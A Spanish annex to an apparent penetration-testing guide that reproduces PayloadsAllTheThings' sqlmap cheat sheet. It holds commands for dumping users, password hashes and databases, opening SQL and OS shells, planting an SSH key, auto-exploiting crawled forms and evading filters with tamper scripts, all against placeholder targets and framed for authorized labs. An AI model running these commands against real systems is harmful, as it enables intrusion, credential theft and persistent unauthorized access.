# SQL injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [SQL Injection/SQLmap.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/SQL%20Injection/SQLmap.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. SQLmap / Básicos Arguments For SQLmap

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

## 2. SQLmap / Load A Solicitud Archivo

```powershell
sqlmap -r request.txt
```

## 3. SQLmap / Personalizado Inyección Point

```powershell
sqlmap -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
```

### Variantes presentes en tablas o texto del apartado

```text
*
```

## 4. SQLmap / Second Order Inyección

```powershell
sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

## 5. SQLmap / Getting A Shell

```ps1
    sqlmap -u "http://example.com/?id=1"  -p id --sql-shell
```

```ps1
    sqlmap -u "http://example.com/?id=1"  -p id --os-shell
```

```ps1
    sqlmap -u "http://example.com/?id=1"  -p id --os-pwn
```

```ps1
    sqlmap -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
```

## 6. SQLmap / Crawl And Auto-Explotación

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

### Variantes presentes en tablas o texto del apartado

```text
--batch
--crawl
--forms
```

## 7. SQLmap / Proxy Configuration For SQLmap

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://www.target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"
```

```ps1
    --proxy="http://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="http://user:pass@127.0.0.1:8080"
```

```ps1
    --proxy="socks4://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="socks4://user:pass@127.0.0.1:1080"
```

```ps1
    --proxy="socks5://[username]:[password]@[proxy_ip]:[proxy_port]"
    --proxy="socks5://user:pass@127.0.0.1:1080"
```

### Variantes presentes en tablas o texto del apartado

```text
--proxy
```

## 8. Inyección Tampering / Suffix And Prefix

```powershell
sqlmap -u "http://example.com/?id=1"  -p id --suffix="-- "
```

### Variantes presentes en tablas o texto del apartado

```text
--suffix
--prefix
--suffix=SUFFIX
--prefix=PREFIX
```

## 9. Inyección Tampering / Default Tamper Scripts

```powershell
sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=<tamper-script-name>
```

## 10. Inyección Tampering / Personalizado Tamper Scripts

```py
import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGH

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    retVal = payload

    match = re.search(r"(?i)LIMIT\s*(\d+),\s*(\d+)", payload or "")
    if match:
        retVal = retVal.replace(match.group(0), "LIMIT %s OFFSET %s" % (match.group(2), match.group(1)))

    return retVal
```

```ps1
    /usr/share/sqlmap/tamper/
```

```ps1
    sqlmap -u "http://target.com/vuln.php?id=1" --tamper=mytamper
```

### Variantes presentes en tablas o texto del apartado

```text
__priority__
dependencies()
tamper(payload)
mytamper.py
tamper/
```

## 11. Inyección Tampering / Personalizado SQL Payload

```ps1
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query="SELECT version()"
```

### Variantes presentes en tablas o texto del apartado

```text
--sql-query
```

## 12. Inyección Tampering / Evaluate Python Code

```ps1
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import random; id=random.randint(1,10)"
sqlmap -u "http://example.com/vulnerable.php?id=1" --eval="import hashlib;id2=hashlib.md5(id).hexdigest()"
```

### Variantes presentes en tablas o texto del apartado

```text
--eval
```

## 13. Inyección Tampering / Preprocess And Postprocess Scripts

```ps1
sqlmap -u 'http://example.com/vulnerable.php?id=1' --preprocess=preprocess.py --postprocess=postprocess.py
```

## 14. Preprocess And Postprocess Scripts / Preprocessing Script (preprocess.py)

```ps1
--preprocess=preprocess.py    Use given script(s) for preprocessing (request)
```

```ps1
#!/usr/bin/env python
def preprocess(req):
    print("Preprocess")
    print(req)
```

## 15. Preprocess And Postprocess Scripts / Postprocessing Script (postprocess.py)

```ps1
--postprocess=postprocess.py  Use given script(s) for postprocessing (response)
```

## 16. SQLmap / Reduce Requests Number

```ps1
sqlmap -u "https://www.target.com/page.php?category=demo" -p category --test-filter="Generic UNION query (NULL)"
sqlmap -u "https://www.target.com/page.php?category=demo" --test-filter="boolean"
```

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --level=1 --risk=1
```

```ps1
sqlmap -u "https://www.target.com/page.php?id=1" --technique=B
```

### Variantes presentes en tablas o texto del apartado

```text
--test-filter
--technique
```

## 17. SQLmap / SQLmap Sin Inyección SQL

```ps1
sqlmap -d "mysql://user:pass@ip/database" --dump-all
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
